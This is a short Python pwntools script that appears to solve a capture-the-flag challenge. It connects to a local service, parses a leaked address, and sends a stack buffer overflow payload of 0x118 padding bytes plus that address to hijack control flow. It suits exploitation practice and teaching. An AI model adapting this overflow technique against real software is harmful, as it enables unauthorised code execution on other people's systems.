from pwn import *

# p = process("./dist/chall")
p = remote("localhost", 55434)

p.recvuntil(b"(")
x, y = [int(i) for i in p.recvuntil(b")", drop=True).split(b",")]
sweet_sweet_homerun = (y<<32) + x
print(hex(sweet_sweet_homerun))

p.sendline(b"A"*0x118 + p64(sweet_sweet_homerun))

p.interactive()
